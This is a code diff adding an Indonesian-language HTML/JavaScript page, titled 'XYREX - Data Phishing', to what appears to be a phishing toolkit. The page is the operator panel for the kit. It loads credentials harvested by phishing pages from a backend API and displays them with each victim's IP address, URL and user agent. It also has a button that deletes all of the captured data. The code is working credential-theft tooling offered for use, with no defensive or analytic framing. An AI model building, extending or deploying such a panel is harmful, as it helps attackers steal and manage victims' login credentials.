@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XYREX - Data Phishing</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+  body { background: linear-gradient(180deg, #c8d6ee 0%, #dbe4f5 100%); min-height: 100vh; padding-bottom: 30px; }
+  .topbar { background: #fff; border-bottom: 3px solid #0a0a0a; padding: 12px 16px; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; }
+  .back-btn { width: 44px; height: 44px; border: 3px solid #0a0a0a; border-radius: 12px; background: #fff; display: flex; align-items: center; justify-content: center; box-shadow: 3px 3px 0 #0a0a0a; text-decoration: none; color: #0a1a3a; }
+  .topbar .brand { font-size: 20px; font-weight: 800; color: #0a1a3a; }
+  .topbar .user-mini { margin-left: auto; background: #f5f8ff; border: 2px solid #0a0a0a; border-radius: 10px; padding: 6px 10px; font-size: 11px; font-weight: 700; color: #0a1a3a; }
+  .title-wrap { padding: 20px 22px 10px 22px; }
+  .title { font-size: 28px; font-weight: 800; color: #0a1a3a; }
+  .title span { color: #b00020; }
+  .subtitle { color: #4a5a7a; font-size: 13px; margin-top: 4px; }
+  .card { background: #fff; border: 3px solid #0a0a0a; border-radius: 18px; margin: 16px 22px; padding: 18px; box-shadow: 4px 4px 0 #0a0a0a; }
+  .btn { display: inline-block; padding: 10px 16px; border: 3px solid #0a0a0a; border-radius: 10px; font-size: 13px; font-weight: 800; cursor: pointer; box-shadow: 3px 3px 0 #0a0a0a; margin-bottom: 8px; margin-right: 6px; }
+  .btn:active { transform: translate(2px, 2px); box-shadow: 1px 1px 0 #0a0a0a; }
+  .btn-primary { background: #1a5fd6; color: #fff; }
+  .btn-danger { background: #b00020; color: #fff; }
+  .btn-success { background: #25d366; color: #fff; }
+  .data-item { background: #f5f8ff; border: 2px solid #0a0a0a; border-radius: 12px; padding: 12px; margin-bottom: 12px; font-size: 12px; }
+  .data-item .meta { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px; font-size: 11px; color: #4a5a7a; }
+  .data-item .meta .badge { background: #b00020; color: #fff; padding: 2px 8px; border-radius: 6px; font-weight: 800; }
+  .data-item .meta .badge.slug { background: #1a5fd6; }
+  .data-item .creds { background: #fff; border: 2px dashed #b00020; border-radius: 8px; padding: 10px; margin-bottom: 8px; font-family: monospace; font-size: 12px; line-height: 1.6; word-break: break-all; }
+  .data-item .creds b { color: #b00020; }
+  .data-item .ua { font-size: 10px; color: #7a8aaa; word-break: break-all; }
+  .empty { text-align: center; padding: 30px; color: #7a8aaa; font-size: 13px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <a class="back-btn" href="/tools.html"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg></a>
+  <div class="brand">Data Phishing</div>
+  <div class="user-mini" id="userMini">-</div>
+</div>
+
+<div class="title-wrap">
+  <div class="title">Data <span>Masuk</span></div>
+  <div class="subtitle">Kredensial yang ditangkap dari phishing page</div>
+</div>
+
+<div class="card">
+  <button class="btn btn-primary" onclick="loadData()">Refresh</button>
+  <button class="btn btn-danger" onclick="clearData()">Hapus Semua</button>
+  <div id="dataContainer" style="margin-top:12px;">-</div>
+</div>
+
+<script src="/tools-toast.js"></script>
+<script>
+const token = localStorage.getItem('xyrex_token');
+const user = localStorage.getItem('xyrex_user');
+if (!token) window.location.href = '/login.html';
+document.getElementById('userMini').textContent = (user || '-').toUpperCase();
+
+async function loadData() {
+  try {
+    const r = await fetch('/api/phishing/data', { headers: { 'x-auth-token': token } });
+    const j = await r.json();
+    const c = document.getElementById('dataContainer');
+    if (!j.ok || !j.data || j.data.length === 0) {
+      c.innerHTML = '<div class="empty">Belum ada data masuk</div>';
+      return;
+    }
+    c.innerHTML = '';
+    j.data.forEach((item, idx) => {
+      const el = document.createElement('div');
+      el.className = 'data-item';
+      const creds = Object.keys(item.data || {}).map(k =>
+        '<b>' + escapeHtml(k) + ':</b> ' + escapeHtml(item.data[k])
+      ).join('<br>');
+      el.innerHTML = '<div class="meta">' +
+        '<span class="badge">#' + (idx + 1) + '</span>' +
+        '<span class="badge slug">' + escapeHtml(item.slug) + '</span>' +
+        '<span>' + new Date(item.time).toLocaleString('id-ID') + '</span>' +
+        '</div>' +
+        '<div class="creds">' + creds + '</div>' +
+        '<div class="ua">IP: ' + escapeHtml(item.ip || '-') + ' | URL: ' + escapeHtml(item.url || '-') + '</div>' +
+        '<div class="ua">UA: ' + escapeHtml((item.ua || '').slice(0, 100)) + '</div>';
+      c.appendChild(el);
+    });
+  } catch (e) {
+    window.xyrexToast('Error: ' + e.message, 'error');
+  }
+}
+
+async function clearData() {
+  if (!confirm('Hapus semua data phishing?')) return;
+  try {
+    const r = await fetch('/api/phishing/data', {
+      method: 'DELETE',
+      headers: { 'x-auth-token': token }
+    });
+    const j = await r.json();
+    if (j.ok) {
+      window.xyrexToast('Data dihapus', 'success');
+      loadData();
+    }
+  } catch (e) {}
+}
+
+function escapeHtml(s) {
+  return String(s || '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+window.addEventListener('load', () => setTimeout(loadData, 300));
+</script>
+
+</body>
+</html>
